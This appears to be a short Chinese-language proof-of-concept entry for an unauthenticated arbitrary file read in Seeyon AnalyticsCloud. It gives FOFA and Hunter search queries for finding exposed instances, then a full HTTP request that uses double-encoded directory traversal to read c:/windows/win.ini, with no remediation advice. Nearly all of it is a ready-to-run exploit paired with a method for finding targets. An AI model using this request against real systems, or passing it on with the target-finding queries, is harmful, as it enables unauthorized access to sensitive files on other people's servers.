## 致远互联AnalyticsCloud分析云存在任意文件读取漏洞

北京致远互联软件股份有限公司AnalyticsCloud分析云存在任意文件读取漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息。

## fofa

```yaml
title="AnalyticsCloud 分析云"
```

## hunter

```yaml
web.title="AnalyticsCloud 分析云"
```

## poc

```yaml
GET /a/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c:/windows/win.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Host: your-ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```

![image-20240719114011759](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191140011.png)